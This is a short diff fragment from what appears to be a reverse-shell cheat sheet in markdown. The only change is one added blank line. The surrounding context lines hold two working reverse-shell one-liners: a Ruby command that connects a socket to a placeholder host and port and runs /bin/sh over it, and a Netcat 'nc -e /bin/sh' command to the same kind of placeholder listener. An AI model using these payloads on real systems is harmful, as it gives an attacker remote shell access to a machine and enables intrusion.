@@ -16,4 +16,5 @@ I'ts most useful Reverse Shell CheetSheet
 `ruby -rsocket -e'f=TCPSocket.open("[LocalHost]",[LocalPort]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
 
 <h2>Netcat</h2>
+
 `nc -e /bin/sh [LocalHost] [LocalPort]`
